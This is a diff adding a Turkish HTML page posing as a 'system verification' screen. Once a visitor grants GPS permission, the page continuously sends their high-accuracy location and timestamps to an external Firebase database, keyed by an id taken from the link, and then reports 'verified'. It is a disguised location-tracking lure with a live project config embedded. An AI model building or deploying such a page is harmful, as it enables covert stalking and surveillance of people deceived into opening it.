@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Doğrulaması</title>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.1.3/firebase-database-compat.js"></script>
+</head>
+<body style="background:#050505; color:#0f0; font-family:monospace; padding:30px;">
+    <div id="s">BAĞLANTI KURULUYOR...</div>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
+            authDomain: "onlinesiparis-2cf91.firebaseapp.com",
+            projectId: "onlinesiparis-2cf91",
+            databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
+            storageBucket: "onlinesiparis-2cf91.appspot.com",
+            messagingSenderId: "366801664755",
+            appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const id = new URLSearchParams(window.location.search).get('id') || "UNKNOWN";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(p => {
+                db.ref('locations/' + id).set({ lat: p.coords.latitude, lng: p.coords.longitude, ts: Date.now() });
+                document.getElementById('s').innerText = "SİSTEM DOĞRULANDI. [OK]";
+            }, e => { document.getElementById('s').innerText = "HATA: GPS İZNİ GEREKLİ."; }, { enableHighAccuracy: true });
+        }
+    </script>
+</body>
+</html>
